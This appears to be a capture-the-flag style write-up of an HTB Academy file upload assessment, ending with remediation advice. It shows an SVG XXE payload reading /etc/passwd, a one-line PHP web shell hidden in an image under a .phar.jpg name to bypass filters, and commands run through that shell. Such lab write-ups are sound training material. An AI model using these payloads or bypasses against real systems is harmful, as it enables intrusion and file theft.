# HTB Academy Skill Assessment Write-Up

**Module:** File Upload Attacks  
**Scenario:** Vulnerability Assessment of a Contact Form Endpoint  
**Author:** Jordan Davis

---

## 🧠 Scenario Summary

The assessment targeted a file upload vulnerability in a contact form on a web application running **Nginx**. The goal was to identify a bypass to upload and execute a PHP web shell, ultimately leading to full remote command execution and flag retrieval.

---

## 🔎 Initial Recon & Setup

- Accessed the `/contact` form on the web app.
- Configured Burp Suite proxy through Firefox to intercept requests.
- Uploaded a `.jpg` file and intercepted the request.

Captured GET request:

```
GET /contact/submit.php?Name=Frank&Email=Castle%40test.com&Message=MARIA&uploadFile=decoy.jpg HTTP/1.1
```

---

## 🐱‍💻 Initial Fuzzing Attempts

### 🔁 1. Content-Type Header Fuzzing

- Used **Burp Intruder** to fuzz the `Content-Type` header with variants like:
  - `image/gif`, `image/jpeg`, `image/png`
  - Leading GIF magic byte + PHP web shell
  - Result: **"Only images are allowed"** response

This suggested both **extension**, **content-type**, and **magic bytes** were inspected.

---

## 💣 SVG XXE Attempt

Tried the following payload with SVG hoping the parser treats it as valid image:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

**Result:** Successful response for `image/svg+xml`, showing `/etc/passwd` output.  
However, could not enumerate flag due to unknown filename.

---

## 📁 Accepted Extensions Fuzzing

Discovered via fuzzing that the following extensions were accepted:

- `.php.jpg`
- `.phps.jpg`
- `.phar.jpg`
- `.phtml.jpg`

Tried POST uploads with valid extensions, content-types, and altered magic bytes — all failed due to inspection logic.

---

## 🔍 Source Code Disclosure via XXE

Used previous XXE method to read the `upload.php` source code. Key findings:

```php
// Blacklist filter
if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) die("Extension not allowed");

// Whitelist filter
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) die("Only images are allowed");

// MIME/content type checks
foreach (array($contentType, $MIMEtype) as $type)
    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) die("Only images are allowed");
```

✅ Confirmed constraints:

- File extension must be lowercase and end in **"g"**
- MIME type must be **image/** with 2–3 lowercase letters ending in **"g"**
- **Magic bytes** are verified — not just headers!

---

## 🛠️ Successful Upload & Web Shell

Steps to bypass filters:

1. Used valid `.phar.jpg` extension (not blacklisted)
2. Intercepted upload request and **appended web shell** to a real image payload
3. Retained original magic bytes and content-type
4. Uploaded successfully

**Web Shell:**

```php
<?php system($_REQUEST[0]); ?>
```

---

## 📂 Locating the Shell

From source:

```php
$target_dir = "./user_feedback_submissions/";
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
```

URL constructed:

```
/contact/user_feedback_submissions/250803_shell.phar.jpg?cmd=ls ../../../../../
```

Confirmed file upload. Located flag and executed:

```
?cmd=cat ../../../../../flag********.txt
```

✅ **Flag successfully retrieved**

---

## 🧱 Challenges Faced

- Misjudged filter logic and wasted time fuzzing non-matching combinations
- Early correct guesses failed due to payload formatting
- Encoding issues (e.g., uppercase/lowercase shell corruption)
- Delay due to date format mismatch for filename

---

## 🛡️ Security Issues & Remediation

### 🔥 Vulnerabilities

- XXE file disclosure via SVG uploads
- Insufficient file extension and MIME filtering
- Upload directory executable by web server
- Source code exposure leading to reverse-engineering of filters

### 🧯 Recommendations

- Implement **allowlist-based MIME and extension checks** (use server-side verification)
- Block **double extensions** (`.php.jpg`) with stronger regex
- Disable execution from upload directories
- Use **file content-type validation** (e.g., `finfo_file()` in PHP)
- Use **prepared filenames** and store them outside web root
- Implement **WAF / ModSecurity** to detect upload bypass patterns

---

## ✅ Summary

Despite layered filters, a bypass was discovered using a hybrid of real image magic bytes and a sneaky web shell inside a `.phar.jpg` file. This underscores the importance of **layered validation**, **execution restrictions**, and secure code practices.
